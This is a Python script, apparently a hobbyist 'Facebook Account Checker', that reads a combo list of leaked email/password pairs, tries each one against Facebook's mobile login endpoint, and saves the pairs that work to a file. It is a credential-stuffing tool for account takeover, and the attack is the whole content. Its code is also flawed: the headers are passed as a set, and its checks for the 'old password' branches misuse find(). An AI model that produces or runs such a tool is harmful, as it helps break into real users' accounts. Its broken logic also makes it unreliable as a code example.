import json
import requests
import os
import random
import colorama
from colorama import init
init()
from colorama import Fore as F

cores = random.choice([F.WHITE, F.GREEN, F.RED, F.BLUE, F.BLACK, F.YELLOW, F.CYAN, F.MAGENTA])
combo = input("Enter your combo: ")
sep = input("Separator: ")
os.system('clear')
os.system('cls')
print(cores + """
	Facebook Account Checker
	Made by Mr Black
	FB > fb.me/mr.black.eg0
	""")

combo = open(combo, 'r').readlines()
combo = [line.replace('\n',"") for line in combo]
for line in combo:
	data = line.split(sep)
	url = 'https://mobile.facebook.com/login'
	headers = {'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0'}
	payload = {'email': data[0], 'pass': data[1]}
	r = requests.post(url, headers=headers, data=payload).text
	if r.find("<title>Entrar no Facebook | Facebook</title>") == -1:
		print(F.GREEN + "[+] Live ~> {}|{}".format(data[0],data[1] + " [+]"))
		print("-- Live accounts --\n" + data[0] + "|" + data[1], file=open("live.txt", "a+"))

	elif r.find('Você usou uma senha antiga. Se você esqueceu sua senha atual, você pode solicitar'):
		print(F.YELLOW + '[!] Senha Antiga [!]')

	elif r.find('Você alterou sua senha a mais de '):
		print(F.YELLOW + '[!] Senha Antiga [!]')


	else:
		print(F.RED + "[-] Die --> {}|{}".format(data[0],data[1] + " [-]"))
